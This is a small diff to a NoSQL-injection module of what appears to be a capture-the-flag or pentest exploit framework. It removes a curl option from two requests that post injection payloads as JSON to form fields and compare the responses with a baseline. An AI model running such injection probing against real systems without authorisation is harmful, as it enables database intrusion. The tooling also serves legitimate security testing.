@@ -17,8 +17,8 @@ class NoSQLModule(ExploitModule):
                 ctx.logger(f"[payload {i}/{len(probes)}] NoSQL Injection")
                 data={n:payload for n in fields[:4]}
                 try:
-                    baseline=await ctx.http.request("POST",action,headers={"Content-Type":"application/json"},content=json.dumps({n:"ctf-baseline" for n in fields[:4]}),use_curl=False,follow_redirects=False)
-                    r=await ctx.http.request("POST",action,headers={"Content-Type":"application/json"},content=json.dumps(data),use_curl=False,follow_redirects=False)
+                    baseline=await ctx.http.request("POST",action,headers={"Content-Type":"application/json"},content=json.dumps({n:"ctf-baseline" for n in fields[:4]}),follow_redirects=False)
+                    r=await ctx.http.request("POST",action,headers={"Content-Type":"application/json"},content=json.dumps(data),follow_redirects=False)
                     ctx.inspect_source(str(r.url),r.text,payload,i,r.headers.get("content-type",""))
                     evidence.append(f"{action} -> {r.status_code}, {len(r.text)} bytes")
                     low=r.text.lower()
